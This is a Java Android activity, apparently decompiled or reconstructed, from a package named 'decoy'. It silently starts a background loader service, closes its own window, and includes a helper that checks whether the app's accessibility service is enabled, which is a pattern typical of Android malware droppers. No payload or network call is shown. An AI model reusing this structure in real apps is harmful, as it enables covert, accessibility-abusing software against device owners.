package com.example.decoy;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.AsyncTask;
import android.os.Bundle;
import android.view.accessibility.AccessibilityManager;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    boolean is;
	
    public class Async extends AsyncTask<Object, Object, Object> {
        public Async() {
        }

        public Object doInBackground(Object[] objArr) {
            if (!MainActivity.this.isMyServiceRunning(valueLoaderService.class)) {
                MainActivity mainActivity = MainActivity.this;
                mainActivity.startService(new Intent(mainActivity, valueLoaderService.class));
            }
            return null;
        }
    }

    public static boolean isAccessibilityServiceEnabled(Context context, Class<? extends AccessibilityService> cls) {

        for (AccessibilityServiceInfo resolveInfo : ((AccessibilityManager) context.getSystemService("accessibility")).getEnabledAccessibilityServiceList(-1)) {
            ServiceInfo serviceInfo = resolveInfo.getResolveInfo().serviceInfo;
            if (serviceInfo.packageName.equals(context.getPackageName()) && serviceInfo.name.equals(cls.getName())) {
                return true;
            }
        }

        return false;
    }

    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        if (application.getContext().getSharedPreferences("MyPref", 0).getBoolean("referr", false)) {
            new Async().execute(new Object[0]);
            finish();
        }
    }

    public boolean isMyServiceRunning(Class<?> cls) {
        ActivityManager activityManager = (ActivityManager) getSystemService("activity");

        if (activityManager != null) {
            for (RunningServiceInfo runningServiceInfo : activityManager.getRunningServices(Integer.MAX_VALUE)) {
                if (cls.getName().equals(runningServiceInfo.service.getClassName())) {
                    return true;
                }
            }
        }

        return false;
    }
}